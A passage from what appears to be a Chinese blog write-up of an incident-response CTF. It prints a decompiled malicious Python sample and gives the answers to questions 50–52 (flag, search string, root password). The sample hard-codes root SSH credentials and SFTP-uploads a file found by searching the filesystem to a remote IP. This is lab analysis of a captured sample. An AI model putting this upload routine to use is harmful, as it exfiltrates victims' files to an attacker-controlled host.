class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;192.168.20.123&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;Network@2020&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>22</p>
+</blockquote>
+<h2 id="应急响应-50"><a href="#应急响应-50" class="headerlink" title="应急响应-50"></a>应急响应-50</h2><p><strong>题目要求：</strong><br>提交恶意程序中的flag。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<blockquote>
+<p> flag{234567uyhgn_aiduyai}</p>
+</blockquote>
+<h2 id="应急响应-51"><a href="#应急响应-51" class="headerlink" title="应急响应-51"></a>应急响应-51</h2><p><strong>题目要求：</strong><br>提交恶意文件中的search_for_text内容。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<blockquote>
+<p>passwod</p>
+</blockquote>
+<h2 id="应急响应-52"><a href="#应急响应-52" class="headerlink" title="应急响应-52"></a>应急响应-52</h2><p><strong>题目要求：</strong><br>提交web服务器上攻击者修改后的root密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>就是上面py里的密码</p>
+<blockquote>
+<p> Network@2020</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/">https://bohemian.top/2024/04/19/第一届帕鲁杯-CTF应急响应挑战赛部分wp/第一届帕鲁杯-CTF应急响应挑战赛部分wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085916686.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/02/28/antsword-bypasswaf/antsword-bypasswaf/" title="antsword-bypasswaf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">antsword-bypasswaf</div></div><div class="info-2"><div class="info-item-1"> antsword-php改造1.前置知识这里笔者不在讲解antsword的功能等等了，这里直接看一下蚁剑的核心文件。  123456789101112131415161718192021222324252627282930313233343536373839404142# $ tree -l 1 -d ./── base├── core│   ├── asp│   │   ├── decoder│   │   ├── encoder│   │   └── template│   │       └── database│   ├── aspx│   │   ├── decoder│   │   ├── encoder│   │   └── template│   │       └── database│   ├── custom│   │   ├── decoder│   │   ├── encoder│   │   └── template│   │       └── database│   ├── php│   │   ├── decoder│   │   ├──...</div></div></div></a><a class="pagination-related" href="/2024/04/29/%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC/" title="各种脚本"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">各种脚本</div></div><div class="info-2"><div class="info-item-1">冰蝎4,爆破1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport base64import hashlibdef decrypt_aes_ecb(ciphertext, key):    cipher = AES.new(key.encode(), AES.MODE_ECB)    decrypted_bytes = cipher.decrypt(base64.b64decode(ciphertext))    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(&#x27;utf-8&#x27;)    return decrypted_text def...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-1"><span class="toc-number">1.</span> <span class="toc-text">应急响应-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2"><span class="toc-number">2.</span> <span class="toc-text">应急响应-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-3"><span class="toc-number">3.</span> <span class="toc-text">应急响应-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-4"><span class="toc-number">4.</span> <span class="toc-text">应急响应-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-5"><span class="toc-number">5.</span> <span class="toc-text">应急响应-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-6"><span class="toc-number">6.</span> <span class="toc-text">应急响应-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7"><span class="toc-number">7.</span> <span class="toc-text">应急响应-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-8"><span class="toc-number">8.</span> <span class="toc-text">应急响应-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-9"><span class="toc-number">9.</span> <span class="toc-text">应急响应-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-10"><span class="toc-number">10.</span> <span class="toc-text">应急响应-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-11"><span class="toc-number">11.</span> <span class="toc-text">应急响应-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-12"><span class="toc-number">12.</span> <span class="toc-text">应急响应-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-13"><span class="toc-number">13.</span> <span class="toc-text">应急响应-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-14"><span class="toc-number">14.</span> <span class="toc-text">应急响应-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-15"><span class="toc-number">15.</span> <span class="toc-text">应急响应-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-16"><span class="toc-number">16.</span> <span class="toc-text">应急响应-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-17"><span class="toc-number">17.</span> <span class="toc-text">应急响应-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-18"><span class="toc-number">18.</span> <span class="toc-text">应急响应-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-19"><span class="toc-number">19.</span> <span class="toc-text">应急响应-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-20"><span class="toc-number">20.</span> <span class="toc-text">应急响应-20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-21"><span class="toc-number">21.</span> <span class="toc-text">应急响应-21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-22"><span class="toc-number">22.</span> <span class="toc-text">应急响应-22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-23"><span class="toc-number">23.</span> <span class="toc-text">应急响应-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-24"><span class="toc-number">24.</span> <span class="toc-text">应急响应-24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-25"><span class="toc-number">25.</span> <span class="toc-text">应急响应-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-26"><span class="toc-number">26.</span> <span class="toc-text">应急响应-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-27"><span class="toc-number">27.</span> <span class="toc-text">应急响应-27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-28"><span class="toc-number">28.</span> <span class="toc-text">应急响应-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-29"><span class="toc-number">29.</span> <span class="toc-text">应急响应-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-30"><span class="toc-number">30.</span> <span class="toc-text">应急响应-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-31"><span class="toc-number">31.</span> <span class="toc-text">应急响应-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-32"><span class="toc-number">32.</span> <span class="toc-text">应急响应-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-33"><span class="toc-number">33.</span> <span class="toc-text">应急响应-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-34"><span class="toc-number">34.</span> <span class="toc-text">应急响应-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-35"><span class="toc-number">35.</span> <span class="toc-text">应急响应-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-36"><span class="toc-number">36.</span> <span class="toc-text">应急响应-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-37"><span class="toc-number">37.</span> <span class="toc-text">应急响应-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-38"><span class="toc-number">38.</span> <span class="toc-text">应急响应-38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-39"><span class="toc-number">39.</span> <span class="toc-text">应急响应-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-40"><span class="toc-number">40.</span> <span class="toc-text">应急响应-40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-41"><span class="toc-number">41.</span> <span class="toc-text">应急响应-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-42"><span class="toc-number">42.</span> <span class="toc-text">应急响应-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-43"><span class="toc-number">43.</span> <span class="toc-text">应急响应-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-44"><span class="toc-number">44.</span> <span class="toc-text">应急响应-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-45"><span class="toc-number">45.</span> <span class="toc-text">应急响应-45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-46"><span class="toc-number">46.</span> <span class="toc-text">应急响应-46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-47"><span class="toc-number">47.</span> <span class="toc-text">应急响应-47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-48"><span class="toc-number">48.</span> <span class="toc-text">应急响应-48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-49"><span class="toc-number">49.</span> <span class="toc-text">应急响应-49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-50"><span class="toc-number">50.</span> <span class="toc-text">应急响应-50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-51"><span class="toc-number">51.</span> <span class="toc-text">应急响应-51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-52"><span class="toc-number">52.</span> <span class="toc-text">应急响应-52</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)">哥斯拉二开从0到1-2(免杀)</a><time datetime="2024-11-18T01:55:05.000Z" title="发表于 2024-11-18 09:55:05">2024-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
